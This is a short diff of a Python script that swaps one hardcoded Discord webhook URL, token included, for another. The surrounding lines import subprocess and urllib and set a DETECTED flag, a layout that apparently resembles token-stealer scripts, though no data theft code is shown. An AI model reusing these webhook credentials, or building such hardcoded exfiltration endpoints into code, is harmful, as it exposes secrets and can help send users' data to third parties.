@@ -18,7 +18,7 @@ import re
 import subprocess
 import json
 import urllib.request
-hook="https://discord.com/api/webhooks/1371572766826041445/SmLSXslsiedPmWMQqiZZuIN9fL-EF067AcIFmqF_j0LHrsYqiaKqUoC_RZX-U7tBFcTm"
+hook="https://discord.com/api/webhooks/1393769856960172093/ztExuWDrWVCThLrZrPc0YRGp9Ak1vbiAVXwIDWHKsGYo-xHZ9d79VvgoLFkopm5Fc94r"
 DETECTED=False
 
 user_input = input("region: ")
